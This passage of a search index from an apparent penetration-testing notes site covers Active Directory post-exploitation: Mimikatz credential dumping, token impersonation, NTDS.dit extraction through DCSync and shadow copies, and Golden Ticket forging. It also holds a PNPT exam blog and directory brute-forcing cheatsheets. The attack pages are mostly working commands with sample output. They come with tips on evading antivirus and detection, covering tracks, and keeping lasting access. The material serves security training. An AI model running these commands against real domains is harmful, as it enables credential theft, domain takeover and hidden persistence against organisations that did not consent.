exactly where to look in the vast memory space of LSASS to find and extract this information.</p>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/mimikatz-cred-dumping/#the-heist-unleashing-the-cat","title":"The Heist: Unleashing the Cat","text":"<p>To use Mimikatz, you must have already gained high-level privileges on the target machine. You typically need to be running as <code>Administrator</code> (with the ability to get debug privileges) or, even better, as <code>NT AUTHORITY\\SYSTEM</code>.</p>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/mimikatz-cred-dumping/#the-prerequisites","title":"The Prerequisites","text":"<ol> <li>Administrator/SYSTEM Access: You cannot run Mimikatz as a standard user.</li> <li>Architecture Match: You must use the correct version of Mimikatz (32-bit or 64-bit) that matches the architecture of the Windows OS you are on.</li> <li>Bypassing Antivirus: Modern AV and EDR solutions are specifically designed to detect and block Mimikatz. A large part of using it successfully involves obfuscation or using techniques to bypass these defenses.</li> </ol>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/mimikatz-cred-dumping/#the-commands-the-holy-trinity","title":"The Commands: The Holy Trinity","text":"<p>Once you have a privileged command prompt on your target, you load the Mimikatz executable.</p> <pre><code>.\\\\mimikatz.exe\n</code></pre> <p>You'll be dropped into the Mimikatz shell. From here, there are three commands that every pentester knows by heart.</p> <ol> <li> <p><code>privilege::debug</code> This is always the first command you run. It attempts to grant your current process the <code>SeDebugPrivilege</code>, which is required to inspect the memory of other processes, including the all-important LSASS.</p> <pre><code>mimikatz # privilege::debug\nPrivilege '20' (SeDebugPrivilege) OK\n</code></pre> </li> <li> <p><code>sekurlsa::logonpasswords</code> This is the flagship command. It reaches into the LSASS process memory and dumps all available credentials for all logged-on user sessions. The output will neatly list users and any passwords, hashes, and tickets associated with them.</p> <pre><code>mimikatz # sekurlsa::logonpasswords\n\nAuthentication Id : 0 ; 4321098\nSession           : Interactive from 1\nUser Name         : DomainAdmin\nDomain            : CORP\nLogon Server      : DC01\nLogon Time        : 7/11/2025 5:15:00 PM\nSID               : S-1-5-21-12345-67890-1234\n        msv :\n        [00000003] Primary\n        * Username : DomainAdmin\n        * Domain   : CORP\n        * NTLM     : 8a7988365108b7425105941324741655\n        * Password : ThisIsMySuperSecurePassword1!\n        wdigest :\n        * Username : DomainAdmin\n        * Domain   : CORP\n        * Password : ThisIsMySuperSecurePassword1!\n</code></pre> </li> <li> <p><code>lsadump::sam</code> This command interacts with the SAM database to dump the hashes of local accounts. It's the Mimikatz equivalent of running <code>secretsdump</code> locally. It's useful for getting the local administrator hash, which is often reused across multiple machines.</p> <pre><code>mimikatz # lsadump::sam\n</code></pre> </li> </ol>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/mimikatz-cred-dumping/#how-it-fits-into-your-attack-strategy","title":"How It Fits into Your Attack Strategy","text":"<p>Mimikatz is the primary credential harvesting and privilege escalation tool in the post-exploitation phase.</p> <ul> <li> <p>It's the Key to Lateral Movement: After compromising one server, you run Mimikatz. You might find the credentials of a Domain Admin who was logged in performing maintenance. You can now use those credentials to access any other server in the domain, including the Domain Controllers.</p> </li> <li> <p>It Reveals Everything: The sheer volume of information dumped by Mimikatz (hashes for Pass the Hash, tickets for Pass the Ticket, plaintext for direct use) gives a pentester a wealth of options for their next move.</p> </li> </ul> <p>Defending against Mimikatz is a cornerstone of modern endpoint security, with techniques like Credential Guard and robust EDR solutions being the primary defenses.</p>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/token-impersonation/","title":"Token Impersonation","text":"<p>You've compromised a server. You have a shell, but you're running as a low-privilege service account like <code>NT AUTHORITY\\NETWORK SERVICE</code>. You run <code>whoami /groups</code> and see that you have a very interesting privilege: <code>SeImpersonatePrivilege</code>. Suddenly, your day just got a lot better.</p> <p>Welcome to the world of Token Impersonation, also known as Token Theft. This isn't about stealing a password hash to crack later. This is about stealing a user's active login session right out from under them. If a Domain Admin is logged onto the server you just compromised, you don't need their password; you just need to borrow their identity for a little while.</p> <p>Think of it like this: A Domain Admin swipes their master keycard to enter a secure room (they log onto the server). The system grants them a temporary security token that says \"This person is a Domain Admin.\" Instead of trying to steal the master keycard, you, the sneaky intruder, simply clone that temporary token. For as long as that token is valid, the system's doors will open for you just as they would for the real admin.</p>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/token-impersonation/#the-why-understanding-windows-access-tokens","title":"The \"Why\": Understanding Windows Access Tokens","text":"<p>Every time a user logs into Windows, the system creates an access token. This token is like a digital ID card that is attached to every process the user starts. It contains information about the user, their group memberships (like \"Domain Admins\"), and their specific privileges.</p> <p>When that user tries to access a file or perform an action, Windows checks their token to see if they have permission.</p> <p>The key to this attack is that Windows processes can have two types of tokens:</p> <ol> <li>Primary Token: The main token that defines the process's identity.</li> <li>Impersonation Token: A temporary token that a thread within a process can use to act on behalf of a different user.</li> </ol> <p>If you have the right privileges (<code>SeImpersonatePrivilege</code> or <code>SeAssignPrimaryTokenPrivilege</code>), you can tell your process to drop its boring, low-privilege token and start using the high-privilege impersonation token of another user who is logged onto the same system.</p>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/token-impersonation/#the-heist-the-art-of-identity-theft","title":"The Heist: The Art of Identity Theft","text":"<p>This attack is a classic post-exploitation technique for privilege escalation on a single machine.</p> <ol> <li>Get a Foothold: You compromise a machine and get a shell. This is often a web server where you're running as a service account.</li> <li>Check Your Privileges: The first thing you do is check who you are and what privileges you have.     <pre><code>whoami /priv\n</code></pre>     If you see <code>SeImpersonatePrivilege</code> or <code>SeAssignPrimaryTokenPrivilege</code> in the list, it's game on. These are very common for service accounts like <code>NETWORK SERVICE</code>.</li> <li>Find Your Target: You need to find a high-value user who is also logged onto the machine. You can list running processes and see who owns them. You're looking for a process owned by a Domain Admin or another privileged account.</li> <li>Steal the Token: Using a specialized tool, you find the process belonging to the Domain Admin and steal its access token.</li> <li>Impersonate: Your current process or thread adopts the stolen token. Running <code>whoami</code> now will show that you are the Domain Admin.</li> <li>Profit: You now have all the rights and permissions of the user you are impersonating. You can add a new user, access sensitive files, or use this new identity to move laterally to other machines.</li> </ol>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/token-impersonation/#the-tools-and-commands","title":"The Tools and Commands","text":"<p>The original and most famous tool for this was Incognito, which now lives on as a module inside both Metasploit and Mimikatz.</p>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/token-impersonation/#using-metasploits-incognito","title":"Using Metasploit's Incognito","text":"<p>If you have a Meterpreter shell, this is incredibly easy.</p> <pre><code>meterpreter &gt; use incognito\nmeterpreter &gt; list_tokens -u\n\nDelegation Tokens Available\n========================================\nCORP\\DomainAdmin\nNT AUTHORITY\\LOCAL SERVICE\n...\n\nmeterpreter &gt; impersonate_token \"CORP\\\\DomainAdmin\"\n[+] Successfully impersonated user CORP\\DomainAdmin\n\nmeterpreter &gt; getuid\nServer username: CORP\\DomainAdmin\n\nmeterpreter &gt; shell\nC:\\Windows\\system32&gt; whoami\ncorp\\domainadmin\n</code></pre> <p>In just two commands, you went from a low-privilege shell to a command prompt running as a Domain Admin.</p>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/token-impersonation/#using-standalone-tools","title":"Using Standalone Tools","text":"<p>On a compromised machine, you can use a number of tools. The popular \"PrintSpoofer\" exploit, for example, abuses the printer service to get a <code>SYSTEM</code> shell, from which you can easily steal any token.</p> <p>After getting <code>SYSTEM</code> (for example, with PrintSpoofer), you can use built-in Windows commands or PowerShell to create a new process running as that user. The concept is to find the process ID of a privileged user's process (e.g., <code>winlogon.exe</code>) and then steal its token to launch a new process like <code>cmd.exe</code>.</p>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/token-impersonation/#how-it-fits-into-your-attack-strategy","title":"How It Fits into Your Attack Strategy","text":"<p>Token Impersonation is a primary local privilege escalation technique.</p> <ul> <li>It's the Next Step after a Foothold: It's often the very first thing you try after compromising a web server or another service box.</li> <li>It Enables Credential Dumping: Once you impersonate a privileged user and become <code>NT AUTHORITY\\SYSTEM</code>, you can then run Mimikatz to dump all the hashes from LSASS, which you couldn't do before.</li> <li>It's Stealthy: You are not creating a new user or installing a backdoor. You are simply using a legitimate, existing login session. From the perspective of the operating system and many logging tools, your actions will appear to be performed by the legitimate user.</li> </ul>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/token-impersonation/#mitigation-how-to-stop-an-identity-thief","title":"Mitigation: How to Stop an Identity Thief","text":"<ul> <li>Principle of Least Privilege: This is the most important defense. Domain Admins should not be logging into member servers (like web servers) for routine tasks. If they don't log in, their token is never available to be stolen.</li> <li>Secure Service Accounts: Configure service accounts with the minimum necessary privileges. They should not be local administrators. Windows has a built-in feature to prevent service accounts with <code>SeImpersonatePrivilege</code> from being able to escalate to <code>SYSTEM</code> in many cases, but misconfigurations can break this.</li> <li>Just Enough Administration (JEA): Use modern administration tools like JEA, which allow admins to perform specific tasks without granting them full interactive logon rights on a server.</li> </ul>"},{"location":"active_directory/04-Post%20Domain%20Compromise/dump-ntds.dit/","title":"Dumping the NTDS.dit","text":"<p>You've done it. After hours of careful enumeration, privilege escalation, and lateral movement, you've finally compromised a Domain Admin account. You have the run of the entire Active Directory domain. The war is won, right? Almost. Now it's time to secure the ultimate prize, the digital crown jewels of the kingdom: the NTDS.dit file.</p> <p>Dumping the NTDS.dit file is the final step in a successful AD pentest. It's the act of exfiltrating the entire Active Directory database, which contains the password hash for every single user and computer in the domain.</p> <p>Think of it this way: If compromising a Domain Admin account is like getting the master key to the bank, dumping NTDS.dit is like wheeling the entire vault out the front door to take home with you. It gives you everything you need to maintain access, crack every password at your leisure, and demonstrate total, unrecoverable compromise to the client.</p>","tags":["ntds","dump"]},{"location":"active_directory/04-Post%20Domain%20Compromise/dump-ntds.dit/#the-why-whats-inside-the-treasure-chest","title":"## The \"Why\": What's Inside the Treasure Chest?","text":"<p>The <code>NTDS.dit</code> file is a database that lives exclusively on Domain Controllers (in <code>C:\\Windows\\NTDS\\</code>). It contains:</p> <ul> <li>Every User's NTLM Hash: The password hashes for all users, from the newest intern to the CEO.</li> <li>Every Computer's Hash: All machine account hashes.</li> <li>The <code>krbtgt</code> Account Hash: This is the most important secret of all. The <code>krbtgt</code> account is used to encrypt all Kerberos tickets in the domain. Owning its hash allows you to forge your own Kerberos tickets (a \"Golden Ticket\" attack), granting you god-like administrative access to anything in the domain, forever.</li> <li>The entire AD schema, group memberships, and GPO information.</li> </ul>","tags":["ntds","dump"]},{"location":"active_directory/04-Post%20Domain%20Compromise/dump-ntds.dit/#the-challenge-the-file-is-locked","title":"## The Challenge: The File is Locked","text":"<p>You can't just copy and paste <code>NTDS.dit</code> like a normal file. The LSASS process has a permanent lock on it while the Domain Controller is running, preventing anyone from tampering with it. Therefore, we need to use special techniques to get a copy.</p>","tags":["ntds","dump"]},{"location":"active_directory/04-Post%20Domain%20Compromise/dump-ntds.dit/#the-heist-methods-for-dumping-the-database","title":"## The Heist: Methods for Dumping the Database","text":"<p>There are several ways to get the goods. You'll also always need the SYSTEM registry hive (<code>C:\\Windows\\System32\\config\\SYSTEM</code>), which contains the boot key required to decrypt the database file.</p>","tags":["ntds","dump"]},{"location":"active_directory/04-Post%20Domain%20Compromise/dump-ntds.dit/#method-1-the-remote-dump-with-secretsdumppy-the-cleanest-way","title":"Method 1: The Remote Dump with <code>secretsdump.py</code> (The Cleanest Way)","text":"<p>This is the preferred method for most pentesters. It's stealthy, fast, and doesn't require you to get an interactive shell on the Domain Controller.</p> <ul> <li>Prerequisite: Credentials for a Domain Admin or any account with Directory Replication Service (DRS) rights.</li> <li>How it Works: Impacket's <code>secretsdump.py</code> uses the DRS protocol to politely ask the DC to replicate its user information, including the password hashes. Because you're using a trusted account, the DC happily complies. No files are touched on the DC's disk.</li> <li>The Command: <pre><code># Run from your attacker machine\nsecretsdump.py -just-dc 'corp.local/DomainAdmin:Password123!'@192.168.1.10\n</code></pre>     This will dump all the hashes and save them to a <code>.ntds</code> file, neatly organized for cracking.</li> </ul>","tags":["ntds","dump"]},{"location":"active_directory/04-Post%20Domain%20Compromise/dump-ntds.dit/#method-2-the-live-dump-with-volume-shadow-copy-the-classic-way","title":"Method 2: The Live Dump with Volume Shadow Copy (The Classic Way)","text":"<p>If you have an interactive shell on the Domain Controller, you can use a built-in Windows feature called the Volume Shadow Copy Service (VSS) to create a snapshot of the disk.</p> <ul> <li>Prerequisite: An interactive shell (RDP, PsExec, WinRM) on the DC as an administrator.</li> <li>How it Works: VSS creates a point-in-time copy of the drive. You can then copy <code>NTDS.dit</code> from this \"shadow\" copy, bypassing the file lock.</li> <li>The Commands: <pre><code># 1. Create a shadow copy for drive C:\nvssadmin create shadow /for=C:\n\n# 2. Copy the NTDS.dit file from the newly created shadow copy\n#    The path will be displayed after creation.\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\temp\\\n\n# 3. Copy the SYSTEM hive needed to decrypt the ntds.dit file\nreg save hklm\\system C:\\temp\\system.hive\n\n# 4. Clean up your tracks by deleting the shadow copy\nvssadmin delete shadows /for=C: /quiet\n</code></pre>     You can now exfiltrate the <code>ntds.dit</code> and <code>system.hive</code> files from the <code>C:\\temp</code> directory.</li> </ul>","tags":["ntds","dump"]},{"location":"active_directory/04-Post%20Domain%20Compromise/dump-ntds.dit/#method-3-the-in-memory-dump-with-mimikatz-the-dcsync-attack","title":"Method 3: The In-Memory Dump with Mimikatz (The DCSync Attack)","text":"<p>Instead of going after the file, you can use Mimikatz to perform a DCSync attack, which uses the same DRS replication rights to pull credentials directly from the LSASS process memory.</p> <ul> <li>Prerequisite: An interactive shell on the DC with administrator/debug privileges.</li> <li>How it Works: You instruct Mimikatz to act like a replica Domain Controller and request user data.</li> <li>The Command: <pre><code>mimikatz # privilege::debug\nmimikatz # lsadump::dcsync /domain:corp.local /all /csv\n</code></pre>     Or, to just get the all-important <code>krbtgt</code> hash:     <pre><code>mimikatz # lsadump::dcsync /user:krbtgt\n</code></pre></li> </ul>","tags":["ntds","dump"]},{"location":"active_directory/04-Post%20Domain%20Compromise/dump-ntds.dit/#how-it-fits-into-your-strategy","title":"## How It Fits into Your Strategy","text":"<p>Dumping NTDS.dit is the final act of a domain compromise. It's the point of no return.</p> <ul> <li>Persistence: The <code>krbtgt</code> hash allows you to create Golden Tickets, ensuring you have persistent, undetectable access to the domain for years to come, even if all other passwords are changed.</li> <li>Total Information Disclosure: You now have the hash for every user. You can take this data offline and run a password cracking campaign to discover the plaintext passwords for a huge percentage of the user base, demonstrating the full impact of the breach.</li> <li>The Ultimate Trophy: For a pentester, the <code>ntds.dit</code> file is the ultimate trophy, proving without a doubt that the entire kingdom has fallen.</li> </ul>","tags":["ntds","dump"]},{"location":"active_directory/04-Post%20Domain%20Compromise/golden-ticket/","title":"Golden Ticket","text":"<p>You've dumped the <code>krbtgt</code> account credentials from a Domain Controller. You have its NTLM hash, but in a modern, secure Active Directory environment, that's only half the story. The true power lies in the stronger cryptographic keys derived from that password: the AES keys.</p> <p>A Golden Ticket attack is the creation of a forged Kerberos Ticket-Granting Ticket (TGT). By forging it with the <code>krbtgt</code> account's secret keys, you can grant yourself administrative access to any resource, as any user, for as long as you desire. While the NTLM hash works for older encryption, using the AES key is the modern, preferred method that ensures your ticket is accepted in a hardened environment.</p> <p>Think of it like this: The NTLM hash is the master key to the kingdom's old iron locks. The AES key is the master key for the new, high-security digital locks. To guarantee entry everywhere, you need the key for the modern locks.</p>"},{"location":"active_directory/04-Post%20Domain%20Compromise/golden-ticket/#the-why-upgrading-from-ntlm-to-aes-keys","title":"The \"Why\": Upgrading from NTLM to AES Keys","text":"<p>The <code>krbtgt</code> account's password hash is used to sign all Kerberos tickets. In older domains, this was done using the RC4-HMAC algorithm, which is based on the NTLM hash.</p> <p>However, starting with Windows Server 2008, Active Directory introduced support for stronger AES-256 and AES-128 encryption for Kerberos. In any reasonably modern domain, the Domain Controllers will use and prefer tickets signed with these AES keys.</p> <p>If you create a Golden Ticket signed only with the NTLM hash (RC4) and try to use it in an environment that expects AES, your request will likely be rejected. Therefore, a modern attacker must use the <code>krbtgt</code> AES key to create a fully-functional Golden Ticket.</p>"},{"location":"active_directory/04-Post%20Domain%20Compromise/golden-ticket/#the-heist-forging-with-modern-cryptography","title":"The Heist: Forging with Modern Cryptography","text":"<p>The prerequisites are the same, but your most important ingredient is now the <code>krbtgt</code> AES256 key, which you get when you dump the account's secrets.</p> <ol> <li>The Domain Name: e.g., <code>corp.local</code></li> <li>The Domain SID: The Security Identifier of the domain.</li> <li>The Target User: The user you want to impersonate (usually <code>Administrator</code>).</li> <li>The <code>krbtgt</code> AES256 Key: The modern secret sauce.</li> </ol> <p>Tools like <code>impacket-secretsdump</code> or <code>Mimikatz</code> will dump these keys for you right alongside the NTLM hash.</p>"},{"location":"active_directory/04-Post%20Domain%20Compromise/golden-ticket/#using-mimikatz","title":"Using Mimikatz","text":"<p>The command is nearly identical to before, but instead of <code>/krbtgt</code> (for the NTLM hash), you use <code>/aes256</code>.</p> <pre><code>mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-12345-67890-1234 /aes256:c899b82192534578160b3341434237a8549d532342342342342342342234 /ptt\n</code></pre> <ul> <li>/aes256: You provide the AES256 key for the <code>krbtgt</code> account. This is now the preferred flag over <code>/krbtgt</code>.</li> <li>/ptt: \"Pass the Ticket\" immediately injects the newly forged, AES-strong ticket into your current session.</li> </ul> <p>Your command prompt now operates with the full authority of a Domain Admin, and your Kerberos tickets will be cryptographically modern and accepted everywhere in the domain.</p>"},{"location":"active_directory/04-Post%20Domain%20Compromise/golden-ticket/#using-impacket-ticketerpy","title":"Using Impacket (<code>ticketer.py</code>)","text":"<p>Similarly, with Impacket, you simply swap the hash flag for the key flag.</p> <pre><code># 1. Create the ticket file using the AES key\nticketer.py -aesKey c899b82192534578160b3341434237a8549d532342342342342342342234 -domain-sid &lt;SID&gt; -domain &lt;domain&gt; Administrator\n\n# 2. Set the KRB5CCNAME environment variable to point to the ticket\nexport KRB5CCNAME=Administrator.ccache\n\n# 3. Use other tools like psexec.py, which will automatically use the ticket\npsexec.py -k -no-pass -dc-ip &lt;DC_IP&gt; &lt;domain&gt;/Administrator\n</code></pre>"},{"location":"active_directory/04-Post%20Domain%20Compromise/golden-ticket/#how-it-fits-into-your-strategy-modern-persistence","title":"How It Fits into Your Strategy: Modern Persistence","text":"<p>Using the AES key doesn't change the strategy; it perfects it.</p> <ul> <li> <p>It's The Standard: In any pentest against a post-2008 domain, using the AES key should be your default method for forging Golden Tickets.</p> </li> <li> <p>Bypasses Some Detections: Security tools monitoring for weak RC4 Kerberos tickets (a common sign of an older-style Golden Ticket attack) will be bypassed when you use a ticket signed with AES.</p> </li> <li> <p>Guaranteed Access: It ensures your ticket will be accepted by modern, patched Domain Controllers and services.</p> </li> </ul> <p>## Mitigation: The Defense is the Same</p> <p>The good news for defenders is that the mitigation strategy doesn't change. Because the AES keys are derived directly from the <code>krbtgt</code> account's password, the same defense applies:</p> <ol> <li> <p>Reset the <code>krbtgt</code> Account Password TWICE. Resetting the password changes the underlying secret from which both the NTLM hash and the AES keys are generated. Doing it twice ensures that all old keys and tickets are invalidated throughout the domain's replication cycle.</p> </li> <li> <p>Protect Your Domain Controllers. The best defense is to prevent an attacker from being able to dump the krbtgt secrets in the first place.</p> </li> </ol>"},{"location":"blog/","title":"Blog","text":""},{"location":"blog/2025/10/22/how-i-conquered-the-pnpt-a-wild-ride-through-cyber-shenanigans/","title":"How I Conquered the PNPT: A Wild Ride Through Cyber Shenanigans","text":"<p>On September 3, 2025, I finally tamed the beast known as the Practical Network Penetration Tester (PNPT) exam. This blog is my victory lap, a chance to share the highs, lows, and downright facepalm moments of my journey. It\u2019s also a love letter to my future self as I gear up for the OSCP (fingers crossed). So, grab a coffee\u2014or an energy drink if you\u2019re feeling my late-night hacking vibes\u2014and let\u2019s dive into how I survived this cyber rollercoaster.</p>"},{"location":"blog/2025/10/22/how-i-conquered-the-pnpt-a-wild-ride-through-cyber-shenanigans/#my-prep-overconfidence-meets-lazy-town","title":"My Prep: Overconfidence Meets Lazy Town","text":"<p>Picture this: I\u2019m an Active Directory (AD) wizard with over eight years as a sysadmin under my belt. I\u2019ve wrangled forests and domains so complex they\u2019d make your head spin. I\u2019ve performed full forest recoveries, hardened systems with CIS benchmarks (spoiler: one wrong Group Policy setting can ruin your day), and debugged AD issues like it\u2019s just another Tuesday. So, when I heard the PNPT was AD-heavy, I thought, \u201cPfft, I\u2019ve got this in the bag.\u201d</p> <p>Add to that my year-long obsession with Hack The Box (HTB) machines\u2014many at Insane difficulty\u2014and I was practically strutting into the exam like a cybersecurity peacock. The PNPT is considered entry-level, so I figured I could skip the course. Big mistake. I got lazy, skimming reviews that said the Practical Ethical Hacker (PEH) module was enough. Newsflash: shortcuts are great for GPS, not for cert exams.</p> <p>I did, however, binge YouTube and Medium reviews the day before my first attempt. Every single one screamed: ENUMERATE, ENUMERATE, ENUMERATE! Some folks couldn\u2019t even get a foothold, which sent my overconfident brain into a mild panic spiral. </p> <p>Tip</p> <p>Make sure your Kali Linux is fresher than a morning smoothie\u2014fully updated with all your favorite tools. A stale Kali is like showing up to a duel with a rusty sword.</p>"},{"location":"blog/2025/10/22/how-i-conquered-the-pnpt-a-wild-ride-through-cyber-shenanigans/#first-attempt-a-comedy-of-errors","title":"First Attempt: A Comedy of Errors","text":"<p>The exam claimed to be a \u201creal-world\u201d pentest. Yeah, right. If the real world involves banging your head against a keyboard for 48 hours, then sure. I struggled hard with the OSINT portion, not because it was technically brutal, but because I forgot the golden rule: stick to the basics. It took me two days to realize I was overcomplicating things. </p> <p>By day three, I finally got a foothold. Hallelujah! But then I dove headfirst into rabbit holes, chasing shiny distractions like a cat with a laser pointer. By day four, I was so exhausted I threw in the towel. Reviews suggested submitting a report even if you fail, as it might earn you a hint. I didn\u2019t bother\u2014because, honestly, what hint was going to save me from my own stubbornness?</p>"},{"location":"blog/2025/10/22/how-i-conquered-the-pnpt-a-wild-ride-through-cyber-shenanigans/#lessons-from-the-first-flop","title":"Lessons from the First Flop","text":"<ul> <li>This ain\u2019t a CTF. Capture The Flag challenges are like: \u201cGrab the user flag, pwn the root, flex on Discord.\u201d The PNPT? It\u2019s more like, \u201cChill, you might not need to be root to win.\u201d Sometimes, less is more.</li> <li>Don\u2019t treat every box like it\u2019s hiding a secret flag. Focus on what\u2019s in front of you.</li> </ul>"},{"location":"blog/2025/10/22/how-i-conquered-the-pnpt-a-wild-ride-through-cyber-shenanigans/#second-attempt-redemption-arc","title":"Second Attempt: Redemption Arc","text":"<p>After my spectacular faceplant, I went back to HTB with a vengeance, grinding AD-focused machines like my life depended on it. I also built a homelab to mimic the exam environment. Spoiler: It helped a lot. I refined my methodology, experimented with new tools, and learned a hard truth: not all tools are created equal. </p> <p>For example, what\u2019s your go-to tunneling tool? <code>Proxychains</code>? <code>Chisel</code>? <code>Sshuttle</code>? I\u2019m team <code>ligolo-ng</code> because it plays nice with <code>nmap</code>, unlike some of its clunkier cousins. Tool choice matters, folks.</p> <p>When the second attempt rolled around, I was ready. The exam environment hadn\u2019t changed, so I hit my previous progress in an hour. But then, predictably, I got stuck again. I was this close to rage-quitting when I decided to take a nap instead. Best. Decision. Ever. Post-nap, I enumerated like a madman, and\u2014poof\u2014the answer was staring me in the face. I felt like I\u2019d just missed the \u201cYou Are Here\u201d sign on a map.</p> <p>An hour later, I was Domain Admin. I couldn\u2019t believe it. I screamed, called my buddy, and probably woke up half the neighborhood. The next day, I reset the lab to take pristine screenshots (pro move) and realized I could\u2019ve pwned the domain in an hour if I\u2019d enumerated properly from the start. This exam isn\u2019t technically brutal\u2014it\u2019s an enumeration marathon.</p> <p>Then came the debrief meeting. I made a rookie mistake: no presentation. There\u2019s a 15-minute timer, and if you can\u2019t walk through your report clearly, it could tank your score. I babbled my way through, finishing with 20 seconds to spare. Talk about cutting it close!</p>"},{"location":"blog/2025/10/22/how-i-conquered-the-pnpt-a-wild-ride-through-cyber-shenanigans/#lessons-from-the-second-shot","title":"Lessons from the Second Shot","text":"<ol> <li>Enumerate like it\u2019s your job. Because it is.</li> <li>Take breaks. Hydrate. Dehydration is the real enemy.</li> <li>Screenshots are your BFF. Document every step like you\u2019re making a scrapbook.</li> <li>Prep a PowerPoint for the debrief. Trust me.</li> <li>Watch the 15-minute timer like a hawk.</li> <li>Celebrate the small wins. You got a foothold? Pop some confetti.</li> </ol>"},{"location":"blog/2025/10/22/how-i-conquered-the-pnpt-a-wild-ride-through-cyber-shenanigans/#tips-to-slay-the-pnpt","title":"Tips to Slay the PNPT","text":"<ul> <li>Choose your tools wisely. Some tools are like that one friend who\u2019s great at parties but useless in a crisis. For example, <code>impacket</code> scripts are gold, but <code>netexec</code> often does the same job faster.</li> <li>Don\u2019t sleep on local admin accounts. Just because a machine is domain-joined doesn\u2019t mean it\u2019s free of juicy local creds.</li> <li>Go beyond the course. The PEH is great, but if you want to be a pentesting rockstar, dive into external resources. HTB, TryHackMe, and YouTube are your playgrounds.</li> </ul>"},{"location":"blog/2025/10/22/how-i-conquered-the-pnpt-a-wild-ride-through-cyber-shenanigans/#resources-that-saved-my-bacon","title":"Resources That Saved My Bacon","text":"<ol> <li>0xdf\u2019s Writeups \u2013 Pure gold for HTB walkthroughs.</li> <li>IppSec\u2019s YouTube Channel \u2013 Like having a pentesting mentor in your ear.</li> <li>How Hackers Move Through Networks (with Ligolo) \u2013 Tunneling tips that\u2019ll make you feel like a network ninja.</li> </ol>"},{"location":"blog/2025/10/22/how-i-conquered-the-pnpt-a-wild-ride-through-cyber-shenanigans/#final-thoughts","title":"Final Thoughts","text":"<p>The PNPT isn\u2019t just about technical chops\u2014it\u2019s about grit, patience, and not being too lazy to enumerate. I went from overconfident slacker to Domain Admin in two attempts, and I\u2019m still kicking myself for those rabbit holes. If I can do it, so can you. Just keep calm, enumerate like a pro, and maybe don\u2019t skip the course like I did.</p> <p>Now, if you\u2019ll excuse me, I\u2019ve got an OSCP to prep for. Wish me luck!</p>"},{"location":"cheatsheets/dirbuster/","title":"DirBuster","text":"<p>DirBuster is a multi-threaded Java application designed to brute-force directories and file names on web/application servers. It\u2019s particularly useful during penetration tests to uncover hidden paths and sensitive files.</p> <p>DirBuster is part of the OWASP project and comes pre-installed in distributions like Kali Linux.</p>"},{"location":"cheatsheets/dirbuster/#how-dirbuster-works","title":"\u2699\ufe0f How DirBuster Works","text":"<p>DirBuster works by using a wordlist to send HTTP requests to the target server, attempting to discover: - Hidden directories (e.g., <code>/admin/</code>, <code>/backup/</code>) - Sensitive files (e.g., <code>config.php</code>, <code>db.sql</code>) - Access control misconfigurations</p> <p>It supports recursive brute-forcing and custom file extensions.</p>"},{"location":"cheatsheets/dirbuster/#how-to-launch-dirbuster","title":"\ud83d\udda5\ufe0f How to Launch DirBuster","text":""},{"location":"cheatsheets/dirbuster/#from-terminal-kali-or-parrot-os","title":"From Terminal (Kali or Parrot OS)","text":"<pre><code>dirbuster\n</code></pre>"},{"location":"cheatsheets/dirbuster/#manually-if-not-in-path","title":"Manually (If not in PATH)","text":"<pre><code>java -jar /path/to/DirBuster.jar\n</code></pre>"},{"location":"cheatsheets/dirbuster/#basic-usage-steps","title":"\ud83e\ude9b Basic Usage Steps","text":"<ol> <li>Target URL: Enter the base URL (e.g., <code>http://192.168.1.100</code>)</li> <li>Wordlist: Choose a wordlist (e.g., from <code>/usr/share/wordlists/dirbuster/</code>)</li> <li>File Extensions: Add common extensions (<code>.php</code>, <code>.html</code>, etc.)</li> <li>Threads: Set the number of threads (10\u201350 is typical)</li> <li>Start Scan: Click \"Start\" to begin brute-forcing</li> </ol>"},{"location":"cheatsheets/dirbuster/#wordlist-options","title":"\ud83d\udcc2 Wordlist Options","text":"<p>Common wordlists for DirBuster: - <code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code> - <code>/usr/share/wordlists/dirb/common.txt</code> - SecLists: <code>/usr/share/seclists/Discovery/Web-Content/</code></p>"},{"location":"cheatsheets/dirbuster/#features","title":"\ud83d\udccc Features","text":"Feature Description GUI-Based User-friendly interface for real-time monitoring Recursive Scanning Automatically explores found directories File Extension Support Allows appending file extensions during brute force Custom HTTP Headers Supports custom headers for advanced testing"},{"location":"cheatsheets/dirbuster/#when-to-use-dirbuster","title":"\u2705 When to Use DirBuster","text":"<ul> <li>During web application penetration tests</li> <li>When you want visual monitoring of brute-force attempts</li> <li>For recursive scanning of deeply nested directories</li> </ul>"},{"location":"cheatsheets/dirbuster/#limitations","title":"\u26a0\ufe0f Limitations","text":"<ul> <li>Slower than command-line tools like Gobuster or ffuf</li> <li>Noisy \u2013 can easily trigger IDS/WAF alerts</li> <li>Java-based \u2013 can be less stable and more resource-intensive</li> </ul>"},{"location":"cheatsheets/dirbuster/#tips-tricks","title":"\ud83d\udca1 Tips &amp; Tricks","text":"<ul> <li>Use multiple wordlists (start small, then go deeper)</li> <li>Watch for response codes: <code>200</code>, <code>403</code>, <code>401</code>, <code>301</code></li> <li>Combine with Burp Suite to manually probe interesting results</li> <li>Look out for default directories like <code>/admin/</code>, <code>/login/</code>, <code>/test/</code>, <code>/old/</code></li> </ul>"},{"location":"cheatsheets/dirbuster/#alternative-tools","title":"\ud83e\udde0 Alternative Tools","text":"<p>If you prefer CLI tools over GUI: - <code>gobuster</code> - <code>ffuf</code> - <code>dirsearch</code></p>"},{"location":"cheatsheets/gobuster/","title":"Gobuster","text":"<p>Gobuster is a fast and flexible command-line tool written in Go, used to brute-force: - URIs (directories and files) on web servers - DNS subdomains - Virtual hosts - S3 buckets - Open directories in file systems</p> <p>It is commonly used during web application enumeration to find hidden resources or endpoints.</p>"},{"location":"cheatsheets/gobuster/#how-gobuster-works","title":"\u2699\ufe0f 